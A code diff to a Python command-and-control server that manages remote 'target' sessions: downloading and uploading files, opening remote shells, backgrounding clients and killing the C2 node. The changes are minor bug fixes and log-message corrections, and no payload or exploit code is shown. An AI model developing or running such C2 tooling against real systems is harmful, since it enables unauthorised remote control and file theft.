@@ -79,9 +79,9 @@ def download_file(sock: socket.socket, path: str) -> None:
     :type path: str
     :return: None
     """
+    raddr = sock.getpeername()
     logging.info(f"{raddr} - Downloading file from target.")
     # Implemented segmentation when writing / receiving file data to avoid memory overload
-    raddr = sock.raddr
     file_name = pathlib.Path(path).name  # File name without the full path
     dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
     original = sock.gettimeout()
@@ -133,7 +133,7 @@ def upload_file(sock: socket.socket, path: str) -> None:
     :type path: str
     :return: None
     """
-    raddr = sock.raddr
+    raddr = sock.getpeername()
     logging.info(f"{raddr} - Uploading file to target.")
     # Implemented segmentation when reading / sending file data to avoid memory overload
     path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
@@ -189,7 +189,7 @@ def recv_msg(sock: socket.socket, command: str) -> None:
     :rtype: str
     """
     try:
-        raddr = sock.raddr
+        raddr = sock.getpeername()
         # Only receive the header and extract the message length
         # Can trigger a ValueError if the target disconnects and sends an empty header
         msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
@@ -285,7 +285,8 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
                 if command in ["quit", "exit", "kill"]:  # Quit current client CLI
                     maintain_session = False
                     logging.info(f"{addr} - Closing session on target.")
-                    if command == "kill": logging.critical(f"{addr} - Terminating c2 node.")
+                    if command == "kill":
+                        logging.critical(f"{addr} - Terminating c2 node.")
                     break
                 elif command in ["bg", "background"]:
                     logging.info(f"{addr} - Moving session to background.")
@@ -391,8 +392,8 @@ def handle_connections(s: socket.socket) -> None:
                 if i.isdigit():
                     if 0 <= int(i) < len(CLIENTS):
                         # Start a command line interface for the specified client
+                        logging.info(f"{CLIENTS[int(i)][1]} - Starting new shell on target.")
                         shell(CLIENTS[int(i)][0], CLIENTS[int(i)][1])
-                        logging.info(f"{CLIENTS[int(i)][1]} - tarting new shell on target.")
                     else:
                         print(f"{clr('[!] ERROR: The specified index is out of range')}")
                 else:
